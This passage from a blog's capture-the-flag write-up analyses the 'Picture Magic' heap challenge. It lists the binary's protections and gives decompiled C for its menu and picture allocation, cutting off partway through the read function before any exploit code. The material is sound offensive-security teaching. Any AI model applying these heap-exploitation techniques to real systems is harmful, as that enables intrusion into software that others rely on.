@@ -1,0 +1,1157 @@
+<!doctype html><html lang="en"><head><title>Picture Magic | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="64-bit binary. Heap exploitation. Heap _feng shui_. House of Einherjar. Format String vulnerability"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="64-bit binary. Heap exploitation. Heap _feng shui_. House of Einherjar. Format String vulnerability"><meta itemprop="keywords" content><meta itemprop="name" content="Picture Magic"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="64-bit binary. Heap exploitation. Heap _feng shui_. House of Einherjar. Format String vulnerability"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="Picture Magic"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="64-bit binary. Heap exploitation. Heap _feng shui_. House of Einherjar. Format String vulnerability"><meta name="twitter:description" content="64-bit binary. Heap exploitation. Heap _feng shui_. House of Einherjar. Format String vulnerability"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="Picture Magic"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/htb-challenges/pwn/picture-magic/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- PWN</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/&amp;text=Picture%20Magic" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/htb-challenges/pwn/picture-magic/&amp;title=Picture%20Magic" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Picture Magic</h1><p class="mb4 f6 dib tracked">31 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#read-function">Read function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#show-function">Show function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#unsorted-bin">Unsorted Bin</a></li><li><a href="#house-of-einherjar-null-byte-poison">House of Einherjar (Null-byte poison)</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#unlink-checks-bypass">Unlink checks bypass</a></li><li><a href="#rop-chain">ROP chain</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We have a 64-bit binary called <code>picture_magic</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little  
+RELRO:    <span class="code-dark-green">Full RELRO</span>
+Stack:    <span class="code-dark-green">Canary found</span>
+NX:       <span class="code-dark-green">NX enabled</span>
+PIE:      <span class="code-dark-green">PIE enabled</span>
+RUNPATH:  <span class="code-dark-red">b'.'</span>
+</code></pre></div><p>If we execute it, we need to enter a name and then we have this menu:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./picture_magic</span>
+Welcome to...
+
+ ██████╗ ██╗ ██████╗████████╗██╗   ██╗██████╗ ███████╗    ███╗   ███╗ █████╗  ██████╗ ██╗ ██████╗██╗
+ ██╔══██╗██║██╔════╝╚══██╔══╝██║   ██║██╔══██╗██╔════╝    ████╗ ████║██╔══██╗██╔════╝ ██║██╔════╝██║
+ ██████╔╝██║██║        ██║   ██║   ██║██████╔╝█████╗      ██╔████╔██║███████║██║  ███╗██║██║     ██║
+ ██╔═══╝ ██║██║        ██║   ██║   ██║██╔══██╗██╔══╝      ██║╚██╔╝██║██╔══██║██║   ██║██║██║     ╚═╝
+ ██║     ██║╚██████╗   ██║   ╚██████╔╝██║  ██║███████╗    ██║ ╚═╝ ██║██║  ██║╚██████╔╝██║╚██████╗██╗
+ ╚═╝     ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝ ╚═════╝╚═╝
+
+Your all-in-one tool for creating, viewing, modifying and selling digital pictures on the internet. Let your creativity overflow!  
+
+Before creating your masterpiece, please enter your artist name: asdf
+
++------------------------------+
+|         Picture Magic        |
++------------------------------+
+| 1. Create picture            |
+| 2. Transform picture         |
+| 3. Show picture              |
+| 4. Sell picture              |
+| 5. Change artist name        |
+| 6. Exit                      |
++------------------------------+
+-&gt;
+</code></pre></div><h2 id="reverse-engineering">Reverse engineering</h2><p>It is a typical heap challenge. The reverse engineering process is quite simple, although it is handy to define a structure like this:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">unsigned int</span><span class="mtk1"> width;</span>
+<span class="mtk1">    </span><span class="mtk7 mtki">unsigned int</span><span class="mtk1"> height;</span>  
+<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> data;</span>
+<span class="mtk1">} </span><span class="mtk8 mtku">picture_t</span><span class="mtk1">;</span>
+</code></pre></div><p>This is the <code>main</code> function:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> option;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> in_FS_OFFSET;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> name[</span><span class="mtk6">56</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> canary;</span>
+
+<span class="mtk1">  canary </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">setup</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">banner</span><span class="mtk1">();</span>
+<span class="mtk1">  </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Before creating your masterpiece, please enter yo</span><span class="mtk4">ur artist name: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">41</span><span class="mtk1">, stdout);</span>  
+<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(name, </span><span class="mtk6">56</span><span class="mtk1">, stdin);</span>
+
+<span class="mtk1">  </span><span class="mtk5">do</span><span class="mtk1"> {</span>
+<span class="mtk1">    option </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">menu</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk5">switch</span><span class="mtk1"> (option) {</span>
+<span class="mtk1">    </span><span class="mtk5">default</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid choice!"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">create_picture</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">transform_picture</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">show_picture</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">4</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">sell_picture</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">5</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"New artist name: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">      </span><span class="mtk8">fgets</span><span class="mtk1">(name, </span><span class="mtk6">56</span><span class="mtk1">, stdin);</span>
+<span class="mtk1">      </span><span class="mtk5">break</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">case</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">:</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Goodbye!"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (canary </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">(</span><span class="mtk7 mtki">long</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) (in_FS_OFFSET </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">28</span><span class="mtk1">)) {</span>
+<span class="mtk1">                    </span><span class="mtk3">// WARNING: Subroutine does not return</span>
+<span class="mtk1">        </span><span class="mtk8">__stack_chk_fail</span><span class="mtk1">();</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  } </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>The only special thing is that we have the chance to modify the <code>name</code> variable at any time, which is a 56-byte buffer.</p><h3 id="allocation-function">Allocation function</h3><p>The first option is for creating pictures:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">create_picture</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">p;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">next_free</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (index </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Running low on memory... please make space by del</span><span class="mtk4">eting stored pictures!"</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    p </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">malloc</span><span class="mtk1">(</span><span class="mtk5">0x</span><span class="mtk6">4f8</span><span class="mtk1">);</span>
+
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Width: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">7</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">p-&gt;width);</span>
+<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+<span class="mtk1">    </span><span class="mtk8">fwrite</span><span class="mtk1">(</span><span class="mtk4">"Height: "</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">8</span><span class="mtk1">, stdout);</span>
+<span class="mtk1">    </span><span class="mtk8">__isoc99_scanf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%u</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">p-&gt;height);</span>
+<span class="mtk1">    </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (((p-&gt;height </span><span class="mtk5">*</span><span class="mtk1"> p-&gt;width </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (p-&gt;width </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">)) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> (p-&gt;height </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">4f1</span><span class="mtk1">)) {</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Reading picture into buffer:"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"================================"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">read_picture</span><span class="mtk1">(p);</span>
+<span class="mtk1">      </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"================================"</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Successfully read picture!</span><span class="mtk6">\n</span><span class="mtk4">Picture has been assigned index </span><span class="mtk6">%d</span><span class="mtk4">.</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, index);</span>  
+<span class="mtk1">      pictures[index] </span><span class="mtk5">=</span><span class="mtk1"> p;</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">\n</span><span class="mtk4">Chosen size of (</span><span class="mtk6">%u</span><span class="mtk4">, </span><span class="mtk6">%u</span><span class="mtk4">) cannot be used!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, p-&gt;width, p-&gt;height);</span>
+<span class="mtk1">      </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"Picture must not exceed </span><span class="mtk6">%d</span><span class="mtk4"> bytes!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">4f0</span><span class="mtk1">);</span>
+<span class="mtk1">      </span><span class="mtk8">free</span><span class="mtk1">(p);</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Basically, the program allocates a chunk of size <code>0x4f8</code> and allows us to set a width and a height for the image. Then, it is checked that <code>p->width</code>, <code>p->height</code> and their product don&rsquo;t exceed <code>0x4f0</code>. If so, the program calls <code>read_picture</code>. Otherwise, it shows an error.</p><p>Also, notice the <code>next_free</code> function, which looks for an empty slot in the <code>pictures</code> global array:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">next_free</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> index;</span>
+
+<span class="mtk1">  index </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> index) {</span>
+<span class="mtk1">      </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (pictures[index] </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) </span><span class="mtk5">break</span><span class="mtk1">;</span>  
+
+<span class="mtk1">    index</span><span class="mtk5">++</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> index;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>This is relevant because we only have space for 4 pictures.</p><h3 id="read-function">Read function</h3><p>This is <code>read_picture</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">read_picture</span><span class="mtk1">(</span><span class="mtk7 mtki">picture_t</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk9 mtki">p</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> c;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> cc;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> row;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">uint</span><span class="mtk1"> column;</span>
+
